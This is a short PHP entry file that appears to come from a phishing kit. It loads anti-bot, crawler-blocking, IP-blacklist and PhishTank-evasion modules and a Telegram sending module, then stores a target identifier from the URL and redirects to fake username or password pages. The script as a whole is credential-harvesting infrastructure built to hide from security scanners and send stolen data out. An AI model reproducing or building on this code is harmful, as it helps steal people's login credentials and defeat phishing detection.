<?php 
session_start();
include('./Anti/Bot-Spox.php');
include('./Anti/Bot-Crawler.php');
include('./Anti/new.php');
include('./Anti/IP-BlackList.php');
include('./Anti/Dila_DZ.php');
include('./BOTS/iprange.php');
include('./BOTS/phishtank.php');
include('./BOTS/send/tgapi.php');

if(!empty($_GET['id'])){
    $location = './password.php';
    $_SESSION['USERNAME'] = $_GET['id'];
}
else{
    $location = './username.php';
}
header('location: '.$location);
?>